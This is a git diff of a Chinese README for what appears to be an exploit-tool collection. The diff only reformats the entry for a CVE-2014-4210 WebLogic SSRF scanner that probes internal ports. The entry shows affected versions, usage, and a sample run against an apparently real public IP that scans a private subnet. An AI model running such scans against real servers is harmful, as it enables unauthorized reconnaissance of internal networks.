@@ -16,22 +16,22 @@
 - DES: 部分特殊脚本文件的特殊描述
 
 ## CVE-2014-4210_ssrf_scan.py Weblogic SSRF 漏洞扫描内网端口
-VER:
-```
-Weblogic 10.0.2
-Weblogic 10.3.6
-```
-USE:
-```
+> VER:
+> ```
+> Weblogic 10.0.2
+> Weblogic 10.3.6
+> ```
+> USE:
+> ```
 zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2014-4210_ssrf_scan.py 
 +----------------------------------------------------------------------+
 + USE: python <filename> <target_ip:port> <scan_address> <process>     +
 + EXP: python cve-2014-4210_ssrf_scan.py 1.1.1.1:7001 192.168.1.0 20   +
 + VER: 10.0.2,10.3.6                                                   +
 +----------------------------------------------------------------------+
-```
-EXP:
-```
+> ```
+> EXP:
+> ```
 zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2014-4210_ssrf_scan.py  59.110.214.109:7001 192.168.112.0 30
 192.168.112
 [*]+------------------------+
@@ -45,7 +45,7 @@ zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2014-4210_ssrf_scan.p
 [*]+------------------------+
 [*]+     Scan completed     +
 [*]+------------------------+
-```
+> ```
 
 ## CVE-2014-4210_ssrf_scan.py Weblogic SSRF 漏洞扫描内网端口
 VER:
